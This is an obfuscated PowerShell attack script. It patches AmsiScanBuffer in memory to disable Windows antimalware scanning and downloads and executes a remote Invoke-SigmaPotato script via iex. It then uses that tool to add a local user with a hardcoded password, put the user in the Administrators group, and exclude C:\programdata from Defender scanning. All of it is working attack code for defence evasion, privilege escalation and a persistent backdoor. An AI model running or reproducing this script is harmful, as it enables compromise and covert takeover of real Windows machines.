#Rasta-mouses Amsi-Scan-Buffer patch \n
$BBpEm9BHdoYjo9n1 = @"
using System;
using System.Runtime.InteropServices;
public class BBpEm9BHdoYjo9n1 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr JgFw, string Q2itkl6jJzhAvdnss);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr w9u, UIntPtr Bd8ErMqL, uint L1qVs4bw4tPNij, out uint _cwvVIoq);
}
"@

Add-Type $BBpEm9BHdoYjo9n1

$xgajU = [BBpEm9BHdoYjo9n1]::LoadLibrary("$([char]([byTE]0x61)+[chAR](18+91)+[CHAr]([BYTe]0x73)+[CHar]([Byte]0x69)+[Char](12+34)+[ChAr](100*10/10)+[Char]([bYtE]0x6c)+[chAr]([BYte]0x6c))")
$naR96ssSwKQMdTgY = [BBpEm9BHdoYjo9n1]::GetProcAddress($xgajU, "$([chaR]([BYTe]0x41)+[cHAr](109)+[cHar](115+5-5)+[CHAr]([Byte]0x69)+[CHAR](83)+[chAr]([bYTE]0x63)+[CHaR](97+27-27)+[cHAr]([BYTE]0x6e)+[CHAr](66)+[char]([bytE]0x75)+[chaR](75+27)+[ChAR]([byTE]0x66)+[cHaR]([bYTE]0x65)+[chaR]([bYTe]0x72))")
$p = 0
[BBpEm9BHdoYjo9n1]::VirtualProtect($naR96ssSwKQMdTgY, [uint32]5, 0x40, [ref]$p)
$C_Nb = "0xB8"
$bLLthiUkgp3BhWy = "0x57"
$Ut8 = "0x00"
$WwF2XuwL5 = "0x07"
$p7DosaOsJMPWN8 = "0x80"
$k58 = "0xC3"
$aE6r_wfvZ_FD68Y8 = [Byte[]] ($C_Nb,$bLLthiUkgp3BhWy,$Ut8,$WwF2XuwL5,+$p7DosaOsJMPWN8,+$k58)
[System.Runtime.InteropServices.Marshal]::Copy($aE6r_wfvZ_FD68Y8, 0, $naR96ssSwKQMdTgY, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"






